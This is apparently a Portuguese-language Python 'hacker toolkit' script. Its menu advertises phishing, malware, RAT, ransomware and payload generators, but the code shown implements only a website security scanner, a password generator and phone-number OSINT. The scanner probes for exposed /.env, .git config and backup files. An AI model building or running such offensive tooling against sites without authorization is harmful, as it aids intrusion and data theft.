import datetime
import ipaddress
import shutil
import json
import socket
import ssl
import urllib.error
import urllib.request
from urllib.parse import urlencode, urlparse
import secrets
import phonenumbers
import http.server
import socketserver
import threading
import textwrap
import base64
import time
import os
import sys
import subprocess
import platform
import hashlib
import random
import string
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    import paramiko                                  

def import_paramiko():

    import importlib.util

    if importlib.util.find_spec("paramiko") is None:
        raise ModuleNotFoundError("Biblioteca paramiko não instalada. Instale com: pip install paramiko")

    import paramiko
    return paramiko


RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RESET = "\033[0m"

HOST = "127.0.0.1"
PORT = "8080"

IP = "127.168.0.38"
PORTA = "443"

banner = r"""

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⡶⡶⣶⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡷⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⡀⣴⣻⣳⡄⣠⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠉⣳⢿⣷⡏⠉⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡴⢶⣦⡔⢲⣤⡶⠾⣷⣾⣿⣣⣹⣿⣶⡿⠶⣦⣤⢖⣤⣴⠶⣄⣀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠰⠟⠉⠉⠑⠉⠛⠟⠉⠳⠋⣿⣿⣮⣻⣿⡟⠻⠛⠉⠛⠛⠙⠝⠋⠙⢿⣍⣯⠛⠓⠶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣩⠿⡽⣥⢏⡉⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠼⠃⠀⣹⣇⠀⠣⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡠⠫⢶⣦⣜⣟⣿⣡⣶⠶⠱⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⢿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⠎⠁⠀⠀⠉⢙⣿⣽⣋⠁⠀⠀⠒⠄⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠒⢄⠀⢀⠞⠁⠀⠈⣿⣿⣿⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠎⠀⠀⠈⠀⣠⣾⣿⣿⣿⡍⠑⢮⡁⠘⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣾⣷⣧⣄⡀⠀⠀⢹⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠀⢀⠆⢀⠀⢀⡴⠋⠉⢻⣿⣯⡛⠁⠀⠙⡄⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⢿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠀⡸⠀⡸⠀⡼⠀⠀⠐⣿⡗⣟⣷⠀⠀⢀⠇⠀⢤⣶⣤⡈⢦⡀⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠈⣿⣿⣿⣿⣇⠀
⠀⠀⠀⢰⣇⢠⠇⠀⡇⠀⠀⠀⢙⣾⣽⠁⠀⢠⠞⠀⣼⣿⣿⣿⣿⡄⠹⣄⣈⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⣿⣿⣿⣿⣿⠀
⠀⠀⠀⣼⣿⠏⠀⢠⣇⣀⠀⣰⣿⢿⣿⣷⠖⠋⠀⢀⣿⣿⣿⣿⣿⣿⠀⣿⡏⢀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⡇
⠀⠀⠀⢿⣿⠀⠀⠖⣛⣹⠛⠛⠛⠋⠀⠀⠂⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⠘⣇⠀⠁⠠⠤⢅⡀⠉⣉⣛⣋⡉⢀⣿⣿⣿⣿⣿⡁
⠀⠀⠀⢸⡏⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡿⠻⣿⣿⣿⠇⡈⣄⠀⠀⠀⠀⠈⠑⠾⠿⣿⣿⣿⣿⡟⣿⣿⣿⠀
⠀⠀⠀⣿⠃⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠛⠛⠁⠀⡈⠛⡅⠀⡇⢸⣟⠂⠀⠀⠀⠀⠀⠀⠀⠋⠛⢋⣼⣿⣿⣿⠀
⠀⠀⡼⠃⠀⠀⠀⠀⠀⠔⠁⠀⠀⠀⠀⠐⡏⠀⠀⠀⠀⡇⠀⠀⣧⠀⢢⠀⢱⠸⣿⣯⣠⠀⠀⠀⠀⠀⣀⣴⣠⣺⣿⣿⣿⣿⠀
⠀⢠⠃⢀⣀⠤⠐⢉⣩⣉⠁⠀⠀⠀⠀⡜⢀⣄⣀⠦⡘⠛⢂⠜⠛⢧⠞⠳⢘⡀⢹⣿⣷⠀⠀⢀⡀⣊⡁⠈⠙⣿⣿⣿⣿⣿⠀
⠀⣸⠐⢁⣴⢶⣶⣿⣿⣿⣿⣄⠉⢆⠀⣑⡜⠉⣟⣀⣤⣀⣤⠦⠤⢼⣅⣨⢸⢸⣿⣿⣿⣇⣠⣤⣿⣥⣾⣷⣶⣌⠉⠙⢻⡇⠀
⠀⠙⠷⣾⠣⣿⣿⡿⢿⣿⢻⣿⣷⡜⠀⡛⢿⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠑⠙⣶⠙⣿⣿⣏⣿⠟⣿⣿⣿⣿⣿⣧⠀⢸⡇⠀
⠀⠀⠀⠀⢳⣿⣿⡆⠘⣿⢨⣿⣿⡗⢰⠿⠶⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⢉⣹⣿⣿⡿⢰⣿⡇⣼⣿⣿⡿⠀⢴⠅⠀
⠀⠀⠀⠀⠀⢳⡀⠀⠘⣿⠘⣿⣿⣿⠸⡀⣠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠖⢊⡝⡿⠃⢸⣿⠀⣿⣿⣿⣷⡆⡇⠀⠀
⠀⠀⠀⠀⠀⠈⣧⠀⢸⣿⠀⣿⣷⢻⣻⣾⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠚⠋⠁⠀⣿⡇⢠⣿⣿⣿⡿⠀⣇⠀⠀
⠀⠀⠀⠀⠀⠀⣸⠀⢨⣿⡇⣽⣿⠟⣷⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⢸⣿⣿⣿⠇⢀⡎⠀⠀
⠀⠀⠀⠀⠀⡀⢸⠀⠀⣿⡏⣿⡿⠷⠻⣽⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⣾⣿⣿⠟⠀⣿⠀⠀⠀
⠀⠀⠀⠀⠀⢼⣼⡆⢀⡙⢷⣿⣷⡞⣾⣻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡏⠐⣿⡟⠁⠀⣼⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡇⠀⠘⢾⣿⣯⠗⢿⣻⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠃⠀⣿⣷⣾⣿⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⣏⠂⠀⠀⠹⢷⣿⠿⣿⣧⡤⢶⢲⣦⣤⠤⢤⡠⢄⣀⣀⣤⢤⡦⡴⡆⠀⣿⡃⠄⢀⣻⣿⣿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⣖⠀⠀⠀⢀⠉⡀⢈⠀⢻⡉⢹⠁⡷⠀⠸⠀⠘⡀⢻⡄⢸⣇⣿⡅⢀⣿⠋⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣦⣆⠀⠀⠈⠐⠄⠘⠉⠉⢻⠞⠒⣾⠲⡴⠒⠾⠓⢺⠙⠉⡿⣿⣶⣾⡿⠂⠀⠐⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢆⠀⠀⠀⠀⡀⠀⠀⠘⠀⠀⠈⠀⠇⠀⢘⠀⠚⠀⠀⠇⢻⣿⣿⡧⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⡄⠀⠀⠁⠐⠶⠆⠐⠀⠀⠀⠒⣀⣠⣆⣀⠀⢤⣠⣾⡿⠉⠀⠀⣀⣠⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⣧⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠙⢿⣿⣿⡿⠿⡿⣯⣶⠆⢠⠌⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣕⠶⣪⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣟⢪⣹⡟⣿⠓⠛⠒⠒⠖⠛⠛⠛⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⢳⢣⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡞⣾⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠅⡟⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                                                                                         
 _____ _____ _____    _____ _____ __  _____ _____ _____    _____ _____ ____  _____ _____ 
|_   _|  |  |   __|  |     |   __|  ||_   _|     |     |  |     | __  |    \|   __| __  |
  | | |     |   __|  |   --|   __|  |__| | |-   -|   --|  |  |  |    -|  |  |   __|    -|
  |_| |__|__|_____|  |_____|_____|_____|_| |_____|_____|  |_____|__|__|____/|_____|__|__|

=============================
  Tool creator: manopaiva26
=============================


"""

print(RED + banner + RESET)

print(GREEN + "🌐Analisador de sites por URL🌐: 1")
print("")
print(YELLOW + "🔠Gerador de senhas🔢: 2")
print("")
print(GREEN + "🗣️Verificação de Telefone📞: 3")
print("")
print(YELLOW + "🌎IPgeolocation🌏: 4")
print("")
print(GREEN + "🐟zphisher🐠: 5")
print("")
print(YELLOW + "​🦠Malware Generator (apenas para windows)👾: 6")
print("")
print(GREEN + "📡Internet options📡: 7")
print("")
print(YELLOW + "📝Etapas de aprendizagem para cybersegurança📝: 8")
print("")
print(GREEN +"🔑BruteForce🔓: 9")
print("")
print(YELLOW +"🧪Payload Forge (SQLi/XSS/OSI)🧪: 10")
print("")
print(GREEN +"🔬Reverse Engineer (Binário/Script)🔬: 11")
print("")
print(YELLOW +"🐀RAT Generator🐁: 12")
print("")
print(GREEN +"💣Ransomware Generator💣: 13")
print("")
option = int(input("Qual deseja utilizar: "))

def preparar_url(url):
    url = url.strip()
    if not url:
        raise ValueError("A URL não pode estar vazia.")
    if "://" not in url:
        url = "https://" + url

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("Informe uma URL HTTP ou HTTPS válida.")
    if parsed.username or parsed.password:
        raise ValueError("Não inclua usuário ou senha na URL.")
    try:
        parsed.port
    except ValueError as erro:
        raise ValueError("A porta informada na URL é inválida.") from erro
    return parsed


def requisitar(url, host_autorizado, headers=None, method="GET", limite=65536):
    url_inicial = urlparse(url)
    porta_inicial = url_inicial.port or (443 if url_inicial.scheme == "https" else 80)

    class RedirecionamentoMesmoHost(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, response_headers, new_url):
            novo_url = urlparse(new_url)
            novo_host = novo_url.hostname
            nova_porta = novo_url.port or (443 if novo_url.scheme == "https" else 80)
            mesmo_host = (novo_host or "").lower().rstrip(".") == host_autorizado.lower().rstrip(".")
            mesma_porta = nova_porta == porta_inicial
            upgrade_padrao = (
                url_inicial.scheme == "http"
                and novo_url.scheme == "https"
                and porta_inicial == 80
                and nova_porta == 443
            )
            if not mesmo_host or not (mesma_porta or upgrade_padrao):
                raise urllib.error.HTTPError(
                    new_url, code, "Redirecionamento para fora do host/porta bloqueado",
                    response_headers, fp
                )
            if req.full_url.startswith("https://") and new_url.startswith("http://"):
                raise urllib.error.HTTPError(
                    new_url, code, "Redirecionamento HTTPS para HTTP bloqueado",
                    response_headers, fp
                )
            return super().redirect_request(
                req, fp, code, msg, response_headers, new_url
            )

    request = urllib.request.Request(
        url,
        headers=headers or {"User-Agent": "AnalisadorEducacional/1.0"},
        method=method,
    )
    opener = urllib.request.build_opener(RedirecionamentoMesmoHost)
    try:
        response = opener.open(request, timeout=8)
    except urllib.error.HTTPError as erro:
        response = erro

    with response:
        corpo = response.read(limite)
        return response.status, response.headers, corpo, response.url


def analisar_dns(host):
    print("\n[DNS]")
    try:
        enderecos = sorted({
            resultado[4][0]
            for resultado in socket.getaddrinfo(host, None)
        })
        print("Endereços encontrados:", ", ".join(enderecos))
        if enderecos:
            ip_principal = next(
                (
                    endereco
                    for endereco in enderecos
                    if ipaddress.ip_address(endereco).version == 4
                ),
                enderecos[0],
            )
            print("IP principal:", ip_principal)
    except socket.gaierror as erro:
        print(f"Falha ao consultar DNS: {erro}")


def analisar_subdominios(host):
    print("\n[Subdomínios]")
    try:
        dominio = host.rstrip(".").encode("idna").decode("ascii").lower()
    except UnicodeError as erro:
        print(f"[INFO] Não foi possível preparar o domínio para consulta: {erro}")
        return

    try:
        ipaddress.ip_address(dominio)
    except ValueError:
        if dominio.startswith("www."):
            dominio = dominio[4:]
    else:
        print("[INFO] A consulta de subdomínios exige um nome de domínio, não um IP.")
        return

    consulta = urlencode({"q": f"%.{dominio}", "output": "json"})
    request = urllib.request.Request(
        f"https://crt.sh/?{consulta}",
        headers={"User-Agent": "AnalisadorEducacional/1.0"},
    )
    try:
        with urllib.request.urlopen(request, timeout=8) as response:
            dados = response.read(1_048_577)
        if len(dados) > 1_048_576:
            print("[INFO] A resposta do crt.sh excedeu o limite de 1 MiB.")
            return
        registros = json.loads(dados.decode("utf-8"))
    except (
        OSError,
        urllib.error.URLError,
        TimeoutError,
        UnicodeError,
        json.JSONDecodeError,
    ) as erro:
        print(f"[INFO] Não foi possível consultar subdomínios no crt.sh: {erro}")
        return

    if not isinstance(registros, list):
        print("[INFO] O crt.sh retornou uma resposta em formato inesperado.")
        return

    subdominios = set()
    sufixo = f".{dominio}"
    for registro in registros:
        if not isinstance(registro, dict):
            continue
        nomes = registro.get("name_value")
        if not isinstance(nomes, str):
            continue
        for nome in nomes.splitlines():
            nome = nome.strip().lower()
            if nome.startswith("*."):
                nome = nome[2:]
            if nome.endswith(sufixo) and nome != dominio:
                subdominios.add(nome)

    if not subdominios:
        print("Nenhum subdomínio encontrado nos registros consultados.")
        return

    print("Subdomínios encontrados em certificados públicos:")
    for subdominio in sorted(subdominios):
        print(f"- {subdominio}")
    print("[INFO] Esses nomes podem ser históricos e não estar ativos atualmente.")


def analisar_tls(host, porta):
    print("\n[Certificado TLS]")
    try:
        contexto = ssl.create_default_context()
        with socket.create_connection((host, porta), timeout=8) as conexao:
            with contexto.wrap_socket(conexao, server_hostname=host) as tls:
                certificado = tls.getpeercert()
                versao_tls = tls.version()
        expiracao = datetime.datetime.fromtimestamp(
            ssl.cert_time_to_seconds(certificado["notAfter"]),
            tz=datetime.timezone.utc,
        )
        emissor = ", ".join(
            f"{chave}={valor}"
            for grupo in certificado.get("issuer", ())
            for chave, valor in grupo
        )
        print(f"TLS negociado: {versao_tls}")
        print(f"Certificado válido até: {expiracao:%Y-%m-%d %H:%M UTC}")
        print("Emissor:", emissor or "não informado")
    except (OSError, ssl.SSLError, KeyError, ValueError) as erro:
        print(f"Não foi possível validar TLS: {erro}")


def analisar_headers(headers, usa_https):
    print("\n[Headers e cookies]")
    verificacoes = {
        "Content-Security-Policy": "Política de segurança de conteúdo (CSP)",
        "X-Content-Type-Options": "Proteção contra MIME sniffing",
        "Referrer-Policy": "Política de Referer",
        "Permissions-Policy": "Política de permissões do navegador",
    }
    for nome, descricao in verificacoes.items():
        valor = headers.get(nome)
        print(f"{'[OK]' if valor else '[ATENÇÃO]'} {descricao}: {valor or 'ausente'}")

    frame_options = headers.get("X-Frame-Options")
    csp = headers.get("Content-Security-Policy", "")
    protege_frames = frame_options or "frame-ancestors" in csp.lower()
    print(
        f"{'[OK]' if protege_frames else '[ATENÇÃO]'} "
        f"Proteção contra framing: {frame_options or ('definida na CSP' if protege_frames else 'ausente')}"
    )

    hsts = headers.get("Strict-Transport-Security")
    if usa_https:
        print(f"{'[OK]' if hsts else '[ATENÇÃO]'} HSTS: {hsts or 'ausente'}")
    elif hsts:
        print(f"[INFO] HSTS recebido por HTTP: {hsts}")

    for cookie in headers.get_all("Set-Cookie", []):
        nome = cookie.split("=", 1)[0]
        atributos = cookie.lower()
        ausentes = [
            flag for flag, presente in (
                ("Secure", " secure" in atributos),
                ("HttpOnly", " httponly" in atributos),
                ("SameSite", " samesite=" in atributos),
            )
            if not presente
        ]
        print(
            f"{'[ATENÇÃO]' if ausentes else '[OK]'} Cookie {nome}: "
            f"atributos ausentes: {', '.join(ausentes) if ausentes else 'nenhum'}"
        )
    if not headers.get_all("Set-Cookie", []):
        print("Nenhum cookie enviado na resposta inicial.")

    for nome in ("Server", "X-Powered-By", "X-Generator"):
        if headers.get(nome):
            print(f"[INFO] {nome}: {headers[nome]}")


def analisar_cors(headers):
    origem = headers.get("Access-Control-Allow-Origin")
    credenciais = headers.get("Access-Control-Allow-Credentials", "").lower()
    if origem == "*" and credenciais == "true":
        print("[ATENÇÃO] CORS combina origem curinga com credenciais; navegadores bloqueiam essa combinação.")
    elif origem == "https://scanner.invalid" and credenciais == "true":
        print("[ALERTA] CORS parece refletir uma origem arbitrária com credenciais.")
    elif origem:
        print(f"[INFO] CORS respondeu Access-Control-Allow-Origin: {origem}")
    else:
        print("[OK] A resposta não liberou CORS para a origem de teste.")


def verificar_exposicoes(base_url, host):
    print("\n[Arquivos e páginas potencialmente expostos]")
    caminhos = (
        ("/.env", (b"=", b"")),
        ("/.git/config", (b"[core]",)),
        ("/backup.zip", (b"PK\x03\x04",)),
        ("/server-status", (b"Apache Server Status", b"Server uptime")),
    )
    for caminho, assinaturas in caminhos:
        try:
            status, _, corpo, _ = requisitar(
                base_url.rstrip("/") + caminho,
                host,
                limite=65536,
            )
            conteudo = corpo.lower()
            exposto = status == 200 and any(
                assinatura.lower() in conteudo
                for assinatura in assinaturas
                if assinatura
            )
            if caminho == "/.env" and status == 200:
                exposto = b"=" in corpo and any(
                    marcador in conteudo
                    for marcador in (b"secret", b"password", b"api_key", b"database")
                )
            print(
                f"{'[ALERTA] Possível arquivo/página exposta' if exposto else '[OK]'} "
                f"{caminho} (HTTP {status})"
            )
        except (OSError, urllib.error.URLError, TimeoutError, ValueError) as erro:
            print(f"[INFO] Não foi possível verificar {caminho}: {erro}")


def verificar_metodos(base_url, host):
    print("\n[Métodos HTTP]")
    try:
        status, headers, _, _ = requisitar(
            base_url,
            host,
            method="OPTIONS",
            limite=0,
        )
        permitidos = headers.get("Allow", "")
        print(f"OPTIONS retornou HTTP {status}; Allow: {permitidos or 'não informado'}")
        if "TRACE" in {metodo.strip().upper() for metodo in permitidos.split(",")}:
            print("[ATENÇÃO] TRACE aparece como método permitido.")
    except (OSError, urllib.error.URLError, TimeoutError, ValueError) as erro:
        print(f"[INFO] Não foi possível consultar OPTIONS: {erro}")


def analise():
    print("[!] Execute somente em sites seus ou para os quais tenha autorização.")
    url = input("Digite a URL que deseja analisar: ")

    try:
        parsed = preparar_url(url)
    except ValueError as erro:
        print(f"[!] URL inválida: {erro}")
        return

    host = parsed.hostname
    porta = parsed.port or (443 if parsed.scheme == "https" else 80)
    print(f"\n[!] Iniciando verificações de baixo impacto em {parsed.geturl()}")
    analisar_dns(host)
    analisar_subdominios(host)

    if parsed.scheme == "https":
        analisar_tls(host, porta)
    else:
        print("\n[Certificado TLS]\n[ATENÇÃO] O endereço informado usa HTTP sem criptografia.")

    try:
        status, headers, corpo, url_final = requisitar(
            parsed.geturl(),
            host,
            headers={
                "User-Agent": "AnalisadorEducacional/1.0",
                "Origin": "https://scanner.invalid",
            },
        )
        print("\n[Resposta HTTP]")
        print(f"Status: {status}")
        print(f"URL final: {url_final}")
        print(f"Tamanho lido: {len(corpo)} bytes (máximo de 64 KiB)")
        analisar_headers(headers, parsed.scheme == "https")
        analisar_cors(headers)

        if b"index of /" in corpo.lower():
            print("[ALERTA] A página parece apresentar listagem de diretório.")
    except (OSError, urllib.error.URLError, TimeoutError, ValueError) as erro:
        print(f"\n[!] Não foi possível consultar a página: {erro}")
        return

    base_url = f"{parsed.scheme}://{parsed.netloc}/"
    verificar_metodos(base_url, host)
    verificar_exposicoes(base_url, host)
    print(
        "\n[!] Resultado preliminar: os alertas são indícios, não confirmação "
        "de vulnerabilidade. Faça uma revisão manual antes de tirar conclusões."
    )

def gerador_de_senhas():
    caracteres = input(
        "Digite os caracteres permitidos (ex.: abcABC123!@#): "
    )
    if not caracteres:
        print("[!] Informe pelo menos um caractere permitido.")
        return

    try:
        tamanho = int(input("Quantos caracteres deve ter a senha? "))
    except ValueError:
        print("[!] O tamanho precisa ser um número inteiro.")
        return

    if not 1 <= tamanho <= 256:
        print("[!] Escolha um tamanho entre 1 e 256.")
        return

    senha = "".join(secrets.choice(caracteres) for _ in range(tamanho))
    print(f"\nSua senha gerada: {senha}")




import phonenumbers
from phonenumbers import geocoder, carrier, timezone


                                                       
DDD_BR = {
    **dict.fromkeys([
        "11"
    ], "São Paulo (SP)"),
    **dict.fromkeys([
        "12", "13", "14", "15", "16", "17", "18", "19"
    ], "São Paulo (SP)"),
    **dict.fromkeys([
        "21", "22", "24"
    ], "Rio de Janeiro (RJ)"),
    "27": "Espírito Santo (ES)",
    "28": "Espírito Santo (ES)",
    **dict.fromkeys([
        "31", "32", "33", "34", "35", "37", "38"
    ], "Minas Gerais (MG)"),
    "36": "DDD não atribuído na tabela",
    **dict.fromkeys([
        "41", "42", "43", "44", "45", "46"
    ], "Paraná (PR)"),
    "47": "Santa Catarina (SC)",
    "48": "Santa Catarina (SC)",
    "49": "Santa Catarina (SC)",
    **dict.fromkeys([
        "51", "53", "54", "55"
    ], "Rio Grande do Sul (RS)"),
    **dict.fromkeys([
        "61"
    ], "Distrito Federal e entorno"),
    **dict.fromkeys([
        "62", "64"
    ], "Goiás (GO)"),
    "63": "Tocantins (TO)",
    **dict.fromkeys([
        "65", "66"
    ], "Mato Grosso (MT)"),
    "67": "Mato Grosso do Sul (MS)",
    "68": "Acre (AC)",
    "69": "Rondônia (RO)",
    **dict.fromkeys([
        "71", "73", "74", "75", "77"
    ], "Bahia (BA)"),
    "79": "Sergipe (SE)",
    **dict.fromkeys([
        "81", "87"
    ], "Pernambuco (PE)"),
    "82": "Alagoas (AL)",
    "83": "Paraíba (PB)",
    "84": "Rio Grande do Norte (RN)",
    **dict.fromkeys([
        "85", "88"
    ], "Ceará (CE)"),
    "86": "Piauí (PI)",
    "89": "Piauí (PI)",
    **dict.fromkeys([
        "91", "93", "94"
    ], "Pará (PA)"),
    "92": "Amazonas (AM)",
    "95": "Roraima (RR)",
    "96": "Amapá (AP)",
    **dict.fromkeys([
        "97"
    ], "Amazonas (AM)"),
    "98": "Maranhão (MA)",
    "99": "Maranhão (MA)",
}


def telefone():
    print("\n=== ANÁLISE DE TELEFONE OSINT ===")

    entrada = input(
        "Telefone internacional (ex.: +55 32 99821-3909): "
    ).strip()

    if not entrada:
        print("[!] Informe um número.")
        return

    try:
        numero = phonenumbers.parse(
            entrada,
            None if entrada.startswith("+") else "BR"
        )
    except phonenumbers.NumberParseException as erro:
        print(f"[!] Erro ao interpretar o número: {erro}")
        return

                          
    possivel = phonenumbers.is_possible_number(numero)
    valido = phonenumbers.is_valid_number(numero)

    codigo = numero.country_code
    regiao_codigo = phonenumbers.region_code_for_number(numero)

                                                                
    nomes_paises = {
        "BR": "Brasil",
        "PT": "Portugal",
        "US": "Estados Unidos",
        "CA": "Canadá",
        "GB": "Reino Unido",
        "ES": "Espanha",
        "FR": "França",
        "DE": "Alemanha",
        "IT": "Itália",
        "JP": "Japão",
        "IN": "Índia",
        "AU": "Austrália",
        "MX": "México",
        "AR": "Argentina",
        "CL": "Chile",
        "CO": "Colômbia",
        "AO": "Angola",
        "MZ": "Moçambique",
    }

    pais = nomes_paises.get(regiao_codigo, "Consultar metadados internacionais")

                           
    descricao = geocoder.description_for_number(numero, "pt")
    tipo_numero = phonenumbers.number_type(numero)

                                                  
    nomes_tipos = {
        phonenumbers.PhoneNumberType.FIXED_LINE: "Telefone fixo",
        phonenumbers.PhoneNumberType.MOBILE: "Celular",
        phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixo ou celular",
        phonenumbers.PhoneNumberType.TOLL_FREE: "Ligação gratuita",
        phonenumbers.PhoneNumberType.PREMIUM_RATE: "Tarifa premium",
        phonenumbers.PhoneNumberType.SHARED_COST: "Custo compartilhado",
        phonenumbers.PhoneNumberType.VOIP: "VoIP",
        phonenumbers.PhoneNumberType.PERSONAL_NUMBER: "Número pessoal",
        phonenumbers.PhoneNumberType.PAGER: "Pager",
        phonenumbers.PhoneNumberType.UAN: "UAN",
        phonenumbers.PhoneNumberType.VOICEMAIL: "Correio de voz",
        phonenumbers.PhoneNumberType.UNKNOWN: "Desconhecido",
    }

    tipo = nomes_tipos.get(tipo_numero, "Desconhecido")

    estado = "Não identificado"
    codigo_area = "Não disponível"

                                          
    if regiao_codigo == "BR":
        nacional = str(numero.national_number)
        if len(nacional) >= 10:
            ddd = nacional[:2]
            codigo_area = ddd
                                                                            
                                                                                 
            if 'DDD_BR' in globals():
                estado = DDD_BR.get(ddd, "Estado não mapeado")
            else:
                estado = f"DDD {ddd}"

                                                                         
    elif descricao:
        estado = descricao

    operadora = carrier.name_for_number(numero, "pt")
    fusos = timezone.time_zones_for_number(numero)

    print("\n========== RESULTADO ==========")
    print(f"Número possível: {'Sim' if possivel else 'Não'}")
    print(f"Número válido: {'Sim' if valido else 'Não'}")
    print(f"País: {pais}")
    print(f"Código internacional: +{codigo}")
    print(f"Tipo: {tipo}")
    print(f"Estado/região associada: {estado}")
    print(f"Código de área/DDD: {codigo_area}")
    print(f"Descrição geográfica: {descricao or 'Não disponível'}")
    print(f"Operadora indicada: {operadora or 'Não identificada'}")
    print(
        "Fusos associados: "
        + (", ".join(fusos) if fusos else "Não disponíveis")
    )

    if valido:
        print(
            "Formato internacional: "
            + phonenumbers.format_number(
                numero,
                phonenumbers.PhoneNumberFormat.INTERNATIONAL
            )
        )

    print("\n[INFO] A região é estimada pelo plano de numeração.")
    print("[INFO] Não indica a localização física atual do titular.")
    print("[INFO] Em outros países, o estado pode não estar disponível.")
    print("===============================")

